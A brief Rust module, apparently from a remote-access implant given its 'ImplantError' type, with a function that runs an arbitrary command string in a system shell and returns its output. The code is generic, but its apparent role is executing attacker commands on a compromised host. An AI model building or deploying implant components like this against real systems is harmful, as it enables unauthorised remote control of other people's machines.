use execute::{shell, Execute};
use std::process::Stdio;

use crate::errors::ImplantError;

pub fn execute_command(command_value: String) -> Result<Vec<u8>, ImplantError> {
    let mut command = shell(command_value);

    command.stdout(Stdio::piped());

    let output = command.execute_output()?;

    Ok(output.stdout)
}
